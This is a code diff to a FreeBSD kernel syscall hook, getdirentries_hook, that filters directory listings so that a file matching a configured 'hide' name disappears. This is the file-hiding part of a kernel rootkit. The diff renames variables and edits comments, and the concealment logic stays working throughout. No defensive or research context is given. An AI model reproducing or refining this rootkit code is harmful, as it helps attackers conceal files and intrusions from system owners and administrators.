@@ -55,7 +55,7 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
                 u_int8_t d_namelen, //[man]Length of the filename excluding null byte.
                 char d_name[MAXNAMELEN + 1] //[man]Null terminated file name
                 }*/*dirptr, *currptr;
-    unsigned int tbytes, count, reclen;
+    unsigned int tbytes, count, length;
     int flag = 0;
 
     /* call the original getdirentries */
@@ -75,19 +75,17 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 
         /* Iterate through the directory entries */
         while (count > 0) {
-            reclen = currptr->d_reclen;
-            count -= reclen;
+            length = currptr->d_reclen;
+            count -= length;
 
-            /* Check if the entry name matches the hide config */
+            /* Check if the entry name mathes the hide config */
             if (strcmp((char *)&(currptr->d_name), (char *)&hide) == 0){
-                /* If the currptr is pointing to the last entry, no need to remove */
                 if (count != 0) {
-                    /* Copy the rest of entries to the address of current node, overwrite the hidden file */
-                    bcopy((char *)currptr + reclen, currptr, count);
+                    bcopy((char *)currptr + length, currptr, count); //Remove it from the result
                     flag = 1;
                 }
                 /* Modify transferred bytes */
-                tbytes -= reclen;
+                tbytes -= length;
             }
 
             /* The last directory entry always has a d_reclen of 0. Check to avoid infinite loop */
@@ -97,9 +95,9 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
             }
 
             /* Check if there's anymore to loop */
-            if (count != 0 && flag == 0) {
-                /* Point the currptr to the next entry using d_reclen */
-                currptr = (struct dirent *)((char *)currptr + reclen);
+            if (count !=0 && flag ==0) {
+                /* Point the currptr to the next entry using d_reclen(length) */
+                currptr = (struct dirent *)((char *)currptr + length);
             }
             flag = 0;
         }
